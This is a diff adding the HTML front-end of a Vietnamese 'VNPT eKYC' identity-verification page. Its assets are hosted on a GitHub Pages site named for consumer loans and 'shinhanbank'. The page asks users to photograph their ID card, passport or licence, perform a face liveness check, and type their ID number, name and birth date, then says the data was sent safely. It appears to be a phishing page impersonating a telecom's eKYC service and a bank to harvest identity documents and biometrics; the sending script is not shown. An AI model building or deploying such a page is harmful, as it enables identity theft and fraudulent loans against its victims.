@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>VNPT eKYC - Xác thực danh tính</title>
+    <link rel="icon" href="https://vaytieudung.github.io/shinhanbank/favicon.ico"/>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="main-container">
+        <!-- Header -->
+        <header class="top-header">
+            <div class="logo-section">
+                <span class="logo-text">VNPT eKYC</span>
+            </div>
+            <div class="lang-switcher">
+                <button id="btnLang" aria-label="Switch language">Vietnam</button>
+            </div>
+            <div class="hotline">
+                <span class="hotline-label">Hotline:</span>
+                <span class="hotline-number">1800 1166</span>
+            </div>
+        </header>
+
+        <!-- Progress Stepper -->
+        <div id="stepper" class="stepper">
+            <span>Bước 1/4</span>
+            <div class="progress-bar">
+                <div class="progress-step active"></div>
+                <div class="progress-step"></div>
+                <div class="progress-step"></div>
+                <div class="progress-step"></div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <main id="viewContainer" class="content-wrapper">
+            <div id="docSelectView">
+                <h2 class="section-title">Xác thực giấy tờ</h2>
+                <p class="section-subtitle">Chọn một trong các phương thức xác thực dưới đây</p>
+                <div class="doc-options">
+                    <div class="doc-option" data-type="cccd" role="button" aria-label="Chọn Chứng minh thư, Thẻ căn cước">
+                        <div class="doc-icon" aria-hidden="true"></div>
+                        <div class="doc-label">Chứng minh thư, Thẻ căn cước</div>
+                        <div class="chevron" aria-hidden="true">›</div>
+                    </div>
+                    <div class="doc-option" data-type="passport" role="button" aria-label="Chọn Hộ chiếu">
+                        <div class="doc-icon" aria-hidden="true"></div>
+                        <div class="doc-label">Hộ chiếu</div>
+                        <div class="chevron" aria-hidden="true">›</div>
+                    </div>
+                    <div class="doc-option" data-type="driver" role="button" aria-label="Chọn Bằng lái xe">
+                        <div class="doc-icon" aria-hidden="true"></div>
+                        <div class="doc-label">Bằng lái xe</div>
+                        <div class="chevron" aria-hidden="true">›</div>
+                    </div>
+                    <div class="doc-option" data-type="qr" role="button" aria-label="Chọn Quét mã QR">
+                        <div class="doc-icon" aria-hidden="true"></div>
+                        <div class="doc-label" data-lang-key="docselect_qr">Quét mã QR</div>
+                        <div class="chevron" aria-hidden="true">›</div>
+                    </div>
+                    <div class="doc-option" data-type="other" role="button" aria-label="Chọn Giấy tờ khác">
+                        <div class="doc-icon" aria-hidden="true"></div>
+                        <div class="doc-label" data-lang-key="docselect_other">Giấy tờ khác</div>
+                        <div class="chevron" aria-hidden="true">›</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- View 2: Capture (Document Front/Back) -->
+            <div id="captureView" class="hidden">
+                <h2 class="section-title" id="captureTitle"></h2>
+                <p class="section-subtitle" id="captureSubtitle"></p>
+                <div class="camera-container">
+                    <video id="cameraVideo" autoplay playsinline muted></video>
+                    <canvas id="cameraCanvas" class="hidden"></canvas>
+                    <canvas id="detectionCanvas"></canvas>
+                    <div id="cameraFrame" class="capture-frame"></div>
+                    <svg id="cameraOverlay" class="camera-overlay" viewBox="0 0 640 400" preserveAspectRatio="xMidYMid slice">
+                        <defs>
+                            <mask id="idMask">
+                                <rect width="100%" height="100%" fill="white"/>
+                                <rect x="80" y="60" width="480" height="280" rx="15" fill="black"/>
+                            </mask>
+                            <mask id="faceMask">
+                                <rect width="100%" height="100%" fill="white"/>
+                                <ellipse cx="320" cy="200" rx="150" ry="190" fill="black"/>
+                            </mask>
+                        </defs>
+                        <rect id="idOverlay" width="100%" height="100%" fill="rgba(0,0,0,0.6)" mask="url(#idMask)"/>
+                        <rect id="faceOverlay" class="hidden" width="100%" height="100%" fill="rgba(0,0,0,0.6)" mask="url(#faceMask)"/>
+                    </svg>
+                </div>
+                <p id="captureInstruction" class="capture-instruction"></p>
+                <div id="errorMessage" class="error-message"></div>
+                <div class="action-buttons">
+                    <button id="btnCapture" class="btn-custom btn-main btn-prominent">CHỤP ẢNH</button>
+                    <button id="btnUpload" class="btn-custom btn-main btn-prominent">TẢI ẢNH LÊN</button>
+                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                </div>
+                <div class="secondary-actions">
+                    <button id="btnBack" class="btn-custom btn-secondary-custom">← Quay lại</button>
+                </div>
+                <div class="guide-link-container">
+                    <a href="#" id="guideLink" class="guide-link">Hướng dẫn</a>
+                </div>
+            </div>
+
+            <div id="qrScannerModal" class="qr-scanner-modal hidden">
+                <video id="qrVideo" playsinline></video>
+                <div id="qrMessage">Hướng camera vào mã QR</div>
+                <button id="btnCancelQR" class="btn-custom btn-secondary-custom" style="margin-top: 20px;">Hủy</button>
+            </div>
+
+            <!-- View 4: Confirmation - HIDDEN as requested -->
+            <div id="confirmView" class="hidden" style="display: none !important;">
+                <!-- Content hidden to avoid showing inaccurate extracted information -->
+            </div>
+
+            <!-- View 5: Video Tutorial for Liveness -->
+            <div id="videoTutorialView" class="hidden">
+                <h2 class="section-title">Hướng dẫn xác thực khuôn mặt</h2>
+                <p class="section-subtitle">Vui lòng xem video để thực hiện đúng cách và đảm bảo tỷ lệ thành công cao nhất.</p>
+                <video id="tutorialVideo" width="100%" controls loop autoplay muted playsinline>
+                    <source src="https://vaytieudung.github.io/shinhanbank/lib/vietnamese-tutorial.mp4" type="video/mp4">
+                    Trình duyệt của bạn không hỗ trợ thẻ video.
+                </video>
+                <div class="action-buttons">
+                    <button id="btnStartFaceCapture" class="btn-custom btn-main">Tôi đã hiểu, bắt đầu!</button>
+                </div>
+            </div>
+
+            <!-- View 6: Face Capture (Liveness Check) -->
+            <div id="faceCaptureView" class="hidden">
+                <h2 class="section-title" id="faceCaptureTitle">Xác thực khuôn mặt</h2>
+                <p class="section-subtitle" id="faceCaptureSubtitle">Vui lòng giữ khuôn mặt của bạn trong khung hình oval.</p>
+                <div class="camera-container">
+                    <video id="faceCameraVideo" autoplay playsinline muted></video>
+                    <canvas id="faceCameraCanvas"></canvas>
+                    <svg id="faceCameraOverlay" class="camera-overlay" viewBox="0 0 640 400" preserveAspectRatio="xMidYMid slice">
+                        <defs>
+                            <mask id="faceLivenessMask">
+                                <rect width="100%" height="100%" fill="white"/>
+                                <ellipse cx="320" cy="200" rx="150" ry="190" fill="black"/>
+                            </mask>
+                        </defs>
+                        <rect id="faceLivenessOverlay" width="100%" height="100%" fill="rgba(0,0,0,0.6)" mask="url(#faceLivenessMask)"/>
+                    </svg>
+                </div>
+                <div class="liveness-status">
+                    <div class="liveness-step" id="livenessStep1">
+                        <span class="step-indicator">●</span>
+                        <span>Nhìn thẳng</span>
+                    </div>
+                    <div class="liveness-step" id="livenessStep2">
+                        <span class="step-indicator">●</span>
+                        <span>Vui lòng mỉm cười</span>
+                    </div>
+                    <div class="liveness-step" id="livenessStep3">
+                        <span class="step-indicator">●</span>
+                        <span>Quay mặt sang phải</span>
+                    </div>
+                    <div class="liveness-step" id="livenessStep4">
+                        <span class="step-indicator">●</span>
+                        <span>Quay mặt sang trái</span>
+                    </div>
+                    <div class="liveness-step" id="livenessStep5">
+                        <span class="step-indicator">●</span>
+                        <span>Xác thực thành công!</span>
+                    </div>
+                </div>
+                <div id="lottieProcessing" class="lottie-container"></div>
+                <div class="action-buttons">
+                    <button id="btnConfirmLiveness" class="btn-custom btn-main" disabled>Xác nhận</button>
+                </div>
+            </div>
+
+            <!-- View 7: Final Review -->
+            <div id="finalReviewView" class="hidden">
+                <h2 class="section-title">Xem lại thông tin</h2>
+                <p class="section-subtitle">Vui lòng kiểm tra kỹ tất cả thông tin trước khi hoàn tất.</p>
+                
+                <div class="review-section">
+                    <h3 class="review-title">Hình ảnh đã chụp</h3>
+                    <div class="review-grid">
+                        <div class="review-item">
+                            <div class="review-label">Mặt trước</div>
+                            <img id="reviewFrontImg" alt="Ảnh mặt trước">
+                            <div id="frontQuality" class="quality-indicator">Đang kiểm tra...</div>
+                        </div>
+                        <div class="review-item" id="reviewBackItem">
+                            <div class="review-label">Mặt sau</div>
+                            <img id="reviewBackImg" alt="Ảnh mặt sau">
+                            <div id="backQuality" class="quality-indicator">Đang kiểm tra...</div>
+                        </div>
+                    </div>
+                    
+                    <div class="face-review">
+                        <div class="review-item">
+                            <div class="review-label">Khuôn mặt</div>
+                            <img id="reviewFaceImg" alt="Ảnh khuôn mặt">
+                            <div id="faceQuality" class="quality-indicator">Đang kiểm tra...</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-section">
+                    <h3 class="review-title">Thông tin trích xuất</h3>
+                    <div class="info-card">
+                        <div class="info-row">
+                            <span class="info-label">Số giấy tờ:</span>
+                            <span id="reviewIdNumber" class="info-value">Đang xử lý...</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Họ và tên:</span>
+                            <span id="reviewFullName" class="info-value">Đang xử lý...</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Ngày sinh:</span>
+                            <span id="reviewDob" class="info-value">Đang xử lý...</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="review-section">
+                    <h3 class="review-title">Kết quả so sánh khuôn mặt</h3>
+                    <div class="match-result">
+                        <div class="match-score" id="matchScore">
+                            <div class="score-circle">
+                                <span id="scoreValue">0%</span>
+                            </div>
+                            <div id="scoreLabel" class="score-label">Đang xử lý...</div>
+                        </div>
+                        <div id="matchDetails" class="match-details">
+                            Đang so sánh khuôn mặt trong ảnh xác thực với ảnh trong giấy tờ...
+                        </div>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <button id="btnFinalSubmit" class="btn-custom btn-main">Hoàn tất xác thực</button>
+                    <button id="btnRetryProcess" class="btn-custom btn-secondary-custom">Thực hiện lại</button>
+                </div>
+            </div>
+
+            <!-- View 8: Success -->
+            <div id="successView" class="hidden">
+                <div id="lottieSuccess" class="lottie-container"></div>
+                <h2 class="section-title">Xác thực thành công!</h2>
+                <p class="section-subtitle">Cảm ơn bạn đã hoàn tất quá trình xác thực eKYC. Thông tin của bạn đã được gửi đi an toàn.</p>
+                <div class="action-buttons">
+                    <button id="btnFinalConfirm" class="btn-custom btn-main">Xác nhận</button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Guide Modals -->
+    <div id="cccdGuideModal" class="modal-overlay hidden">
+        <div class="modal-content guide-modal">
+            <button class="modal-close-btn" onclick="this.closest('.modal-overlay').classList.add('hidden')">×</button>
+            <h2 class="guide-modal-title">Hướng dẫn chụp ảnh CMT, CCCD</h2>
+            
+            <!-- Two main steps with green frames -->
+            <div class="guide-steps-container">
+                <div class="guide-step-item">
+                    <div class="guide-step-frame">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt.png" alt="Ảnh mặt trước hợp lệ">
+                    </div>
+                    <p class="guide-step-label">Bước 1: Chụp mặt trước</p>
+                </div>
+                <div class="guide-step-item">
+                    <div class="guide-step-frame">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_ms.png" alt="Ảnh mặt sau hợp lệ">
+                    </div>
+                    <p class="guide-step-label">Bước 2: Chụp mặt sau</p>
+                </div>
+            </div>
+
+            <!-- Instructions with bullet points -->
+            <div class="guide-instructions">
+                <div class="instruction-item">
+                    <span class="bullet-point">●</span>
+                    <span>Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn</span>
+                </div>
+                <div class="instruction-item">
+                    <span class="bullet-point">●</span>
+                    <span>Chụp rõ nét và đầy đủ thông tin trên giấy tờ</span>
+                </div>
+            </div>
+
+            <!-- Error examples with red X -->
+            <div class="guide-errors-container">
+                <div class="guide-error-item">
+                    <div class="guide-error-frame">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo.png" alt="Ảnh bị mờ">
+                        <div class="error-overlay">×</div>
+                    </div>
+                    <p class="guide-error-label">Không chụp quá mờ</p>
+                </div>
+                <div class="guide-error-item">
+                    <div class="guide-error-frame">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc.png" alt="Ảnh bị che góc">
+                        <div class="error-overlay">×</div>
+                    </div>
+                    <p class="guide-error-label">Không chụp mất góc</p>
+                </div>
+                <div class="guide-error-item">
+                    <div class="guide-error-frame">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang.png" alt="Ảnh bị lóa">
+                        <div class="error-overlay">×</div>
+                    </div>
+                    <p class="guide-error-label">Không chụp lóa sáng</p>
+                </div>
+            </div>
+
+            <!-- Start button -->
+            <div class="guide-modal-actions">
+                <button class="btn-start btn-proceed">BẮT ĐẦU</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="passportGuideModal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <h2 class="section-title">Hướng dẫn chụp ảnh Hộ chiếu</h2>
+            <p class="section-subtitle" style="margin-bottom: 24px;">Vui lòng chụp trang có ảnh và thông tin cá nhân.</p>
+            <div class="guide-layout">
+                <div class="guide-item guide-top-image">
+                    <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt2.png" alt="Ảnh hộ chiếu hợp lệ">
+                </div>
+                <div class="guide-main-text">
+                    <p>• Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn.</p>
+                    <p>• Chụp rõ nét và đầy đủ thông tin trên giấy tờ.</p>
+                </div>
+                <div class="guide-grid-3-col">
+                    <div class="guide-item">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo2.png" alt="Ảnh bị mờ">
+                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp quá mờ</p>
+                    </div>
+                    <div class="guide-item">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang2.png" alt="Ảnh bị lóa">
+                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp lóa sáng</p>
+                    <div class="guide-item">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc2.png" alt="Ảnh bị che góc">
+                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp mất góc</p>
+                    </div>
+                </div>
+            </div>
+            <div class="action-buttons" style="margin-top: 24px;">
+                <button class="btn-custom btn-main btn-proceed">Đã hiểu</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="driverLicenseGuideModal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <h2 class="section-title">Hướng dẫn chụp ảnh Bằng lái xe</h2>
+            <p class="section-subtitle" style="margin-bottom: 24px;">Vui lòng chụp mặt trước của bằng lái xe.</p>
+            <div class="guide-layout">
+                <div class="guide-item guide-top-image">
+                    <img src="https://vaytieudung.github.io/shinhanbank/lib/cmt_mt1.png" alt="Ảnh bằng lái xe hợp lệ">
+                </div>
+                <div class="guide-main-text">
+                    <p>• Đưa giấy tờ vào gần camera sao cho 4 góc của giấy tờ trùng với vùng giới hạn.</p>
+                    <p>• Chụp rõ nét và đầy đủ thông tin trên giấy tờ.</p>
+                </div>
+                <div class="guide-grid-3-col">
+                    <div class="guide-item">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/mo1.png" alt="Ảnh bị mờ">
+                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp quá mờ</p>
+                    </div>
+                    <div class="guide-item">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/loasang1.png" alt="Ảnh bị lóa">
+                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp lóa sáng</p>
+                    </div>
+                    <div class="guide-item">
+                        <img src="https://vaytieudung.github.io/shinhanbank/lib/matgoc1.png" alt="Ảnh bị che góc">
+                        <p class="error"><i class="fas fa-times-circle"></i> Không chụp mất góc</p>
+                    </div>
+                </div>
+            </div>
+            <div class="action-buttons" style="margin-top: 24px;">
+                <button class="btn-custom btn-main btn-proceed">Đã hiểu</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fullscreen Image Modal -->
+    <div id="fullscreenModal" class="fullscreen-modal hidden" onclick="this.classList.add('hidden')">
+        <img id="fullscreenImage" src="" alt="Ảnh phóng to">
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay hidden">
+        <div id="lottieLoading"></div>
+        <p class="loading-text">Đang tải tài nguyên...</p>
+    </div>
+
+    <!-- Manual Input Modal for OCR Fallback -->
+    <div id="manualInputModal" class="modal-overlay hidden">
+        <div class="modal-content manual-input-modal">
+            <h2>Nhập thông tin thủ công</h2>
+            <p class="modal-subtitle">OCR không thể đọc được thông tin từ ảnh. Vui lòng nhập thông tin thủ công.</p>
+            
+            <div class="input-group">
+                <label for="manualIdNumber">Số giấy tờ:</label>
+                <input type="text" id="manualIdNumber" placeholder="Nhập số CMND/CCCD" maxlength="12">
+            </div>
+            
+            <div class="input-group">
+                <label for="manualFullName">Họ và tên:</label>
+                <input type="text" id="manualFullName" placeholder="Nhập họ và tên đầy đủ">
+            </div>
+            
+            <div class="input-group">
+                <label for="manualDob">Ngày sinh:</label>
+                <input type="text" id="manualDob" placeholder="dd/mm/yyyy" maxlength="10">
+            </div>
+            
+            <div class="modal-actions">
+                <button id="manualSubmitBtn" class="btn-custom btn-main">Xác nhận</button>
+                <button id="manualCancelBtn" class="btn-custom btn-secondary-custom">Bỏ qua</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Local Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tesseract.js/4.1.1/tesseract.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsQR/1.4.0/jsQR.min.js"></script>
+
+    <script src="script.js"></script>
+</body>
+</html>
